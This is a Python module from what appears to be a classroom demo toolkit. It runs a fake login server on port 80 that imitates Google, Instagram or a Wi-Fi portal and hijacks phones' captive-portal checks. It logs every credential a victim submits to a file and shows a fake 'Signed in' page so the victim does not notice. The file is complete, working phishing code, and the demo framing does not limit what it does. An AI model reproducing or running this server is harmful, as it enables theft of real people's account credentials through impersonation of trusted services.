"""
Phase 4 helper — local HTTP server that hosts a fake login page and logs
any credentials a victim types into it.

Runs on port 80 so a phone browser opening "google.com" lands on it
without showing a port number.
"""

import os
import time
import json
import socket
import threading
import urllib.parse
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional

from .utils import COLORS, info, ok, warn, err


HERE = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(HERE, ".."))
PAGES_DIR = os.path.join(PROJECT_ROOT, "fake_pages")
CAPTURES_DIR = os.path.join(PROJECT_ROOT, "captures")

AVAILABLE_PAGES = ["google", "instagram", "wifi_login"]


_STATE = {
    "server":   None,
    "thread":   None,
    "page":     None,
    "logfile":  None,
}


def write_capture_dir() -> None:
    os.makedirs(CAPTURES_DIR, exist_ok=True)


def choose_page() -> str:
    print(f"\n{COLORS['info']}Pick the fake page to host:{COLORS['end']}")
    for i, p in enumerate(AVAILABLE_PAGES):
        print(f"  [{i}] {p}")
    while True:
        ans = input("    > ").strip()
        try:
            idx = int(ans)
            return AVAILABLE_PAGES[idx]
        except (ValueError, IndexError):
            warn("Please pick a valid index.")


def _make_handler(page: str, logfile_path: str):
    page_dir = os.path.join(PAGES_DIR, page)

    class FakeHandler(BaseHTTPRequestHandler):

        # Quieter default logging — we'll print our own line
        def log_message(self, fmt, *args):
            return

        def _serve_file(self, path: str, content_type: str = "text/html"):
            if not os.path.isfile(path):
                self.send_error(404, "not found")
                return
            with open(path, "rb") as f:
                body = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            url = urllib.parse.urlparse(self.path)
            print(f"  {COLORS['warn']}🌐 GET  {self.client_address[0]} → {url.path}{COLORS['end']}")

            # Captive-portal probes: Android tries
            # /generate_204, /gen_204, etc. We respond with our login page
            # so the captive-portal bubble pops up on the phone.
            captive_paths = ("/generate_204", "/gen_204", "/hotspot-detect.html",
                             "/connecttest.txt", "/ncsi.txt")

            if url.path in ("/", "/index.html") or url.path in captive_paths:
                self._serve_file(os.path.join(page_dir, "index.html"))
                return
            # static assets next to the page
            target = os.path.normpath(os.path.join(page_dir, url.path.lstrip("/")))
            if not target.startswith(page_dir):
                self.send_error(403); return
            if os.path.isfile(target):
                ct = "text/html"
                if target.endswith(".css"):  ct = "text/css"
                elif target.endswith(".js"): ct = "application/javascript"
                elif target.endswith(".png"): ct = "image/png"
                elif target.endswith(".svg"): ct = "image/svg+xml"
                elif target.endswith((".jpg", ".jpeg")): ct = "image/jpeg"
                self._serve_file(target, ct)
                return

            # default: serve the login page (so any URL on the phone works)
            self._serve_file(os.path.join(page_dir, "index.html"))

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0) or 0)
            raw = self.rfile.read(length).decode("utf-8", errors="replace")
            try:
                fields = urllib.parse.parse_qs(raw, keep_blank_values=True)
            except Exception:
                fields = {"raw": [raw]}

            event = {
                "ts":     datetime.now().isoformat(timespec="seconds"),
                "ip":     self.client_address[0],
                "page":   page,
                "path":   self.path,
                "fields": {k: v[0] if len(v) == 1 else v for k, v in fields.items()},
                "ua":     self.headers.get("User-Agent", ""),
            }

            # Log to disk
            try:
                with open(logfile_path, "a") as f:
                    f.write(json.dumps(event, ensure_ascii=False) + "\n")
            except Exception as e:
                err(f"Could not write capture log: {e}")

            # Loud, visual print so the class GASPS
            print()
            print(f"{COLORS['err']}{'═' * 64}{COLORS['end']}")
            print(f"{COLORS['err']}🔥 CREDENTIALS CAPTURED 🔥{COLORS['end']}")
            print(f"  from : {event['ip']}")
            print(f"  page : {event['page']}")
            print(f"  ua   : {event['ua'][:60]}")
            for k, v in event["fields"].items():
                print(f"  {COLORS['ok']}{k:>10s}{COLORS['end']} = {v}")
            print(f"{COLORS['err']}{'═' * 64}{COLORS['end']}\n")

            # Send the victim a "success-looking" response so they don't
            # immediately suspect anything in the demo.
            success_path = os.path.join(page_dir, "success.html")
            if os.path.isfile(success_path):
                self._serve_file(success_path)
            else:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(
                    b"<html><body style='font-family:sans-serif;text-align:center;"
                    b"margin-top:80px'><h2>Signed in.</h2></body></html>"
                )

    return FakeHandler


def start(page: str, port: int = 80) -> Optional[HTTPServer]:
    """Start the fake login server in a background thread on `port`."""
    if page not in AVAILABLE_PAGES:
        err(f"Unknown page '{page}'. Choose one of: {', '.join(AVAILABLE_PAGES)}")
        return None

    write_capture_dir()
    logfile = os.path.join(
        CAPTURES_DIR,
        f"creds_{page}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl",
    )

    handler_cls = _make_handler(page, logfile)
    try:
        server = HTTPServer(("0.0.0.0", port), handler_cls)
    except PermissionError:
        err(f"Cannot bind to port {port}. Are you running as root?")
        return None
    except OSError as e:
        err(f"Could not bind to port {port}: {e}")
        warn("Tip: another web server (apache, nginx) might already use port 80.")
        return None

    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()

    _STATE["server"]  = server
    _STATE["thread"]  = t
    _STATE["page"]    = page
    _STATE["logfile"] = logfile

    ok(f"Fake '{page}' login page running on http://0.0.0.0:{port}/")
    info(f"Captures will be written to: {logfile}")
    return server


def stop(server) -> None:
    if server is None:
        server = _STATE.get("server")
    if server is not None:
        try:
            server.shutdown()
            server.server_close()
        except Exception:
            pass
    _STATE["server"] = None
    info("Fake server stopped.")


def emergency_stop() -> None:
    stop(_STATE.get("server"))


def read_captured_creds() -> list[str]:
    path = _STATE.get("logfile")
    out: list[str] = []
    if not path or not os.path.isfile(path):
        return out
    try:
        with open(path) as f:
            for line in f:
                try:
                    ev = json.loads(line)
                    flat = ", ".join(f"{k}={v}" for k, v in ev["fields"].items())
                    out.append(f"[{ev['ts']}] {ev['ip']} → {flat}")
                except Exception:
                    pass
    except Exception:
        pass
    return out
